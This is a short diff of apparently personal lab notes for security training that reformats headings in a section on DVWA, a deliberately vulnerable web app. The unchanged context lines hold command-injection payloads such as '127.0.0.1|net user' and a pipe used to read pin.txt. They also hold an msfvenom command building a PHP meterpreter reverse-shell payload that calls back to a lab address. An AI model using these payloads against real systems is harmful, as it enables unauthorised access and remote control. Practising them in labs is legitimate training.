@@ -51,9 +51,9 @@ Snow.exe -C -p “given_password” file_name
 
 | dir c:\ with this command u can see the pin.txt file. But to read the content from this try this command | dir c:\ "pin.txt" or this command ! Take pin.txt
 
-## DVWA 
+## DVWA - You can change the severity from impossible to easy.
 
-WINDOWS - COMMAND INJECTION
+### WINDOWS - COMMAND INJECTION
 
 
 Easy - Command Injection 
@@ -72,7 +72,7 @@ High - Command Injection
 
 127.0.0.1|net user
 
-FILE UPLOAD - WINDOWS
+### FILE UPLOAD - WINDOWS
 
 msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.104 lport=3333 -f raw
 
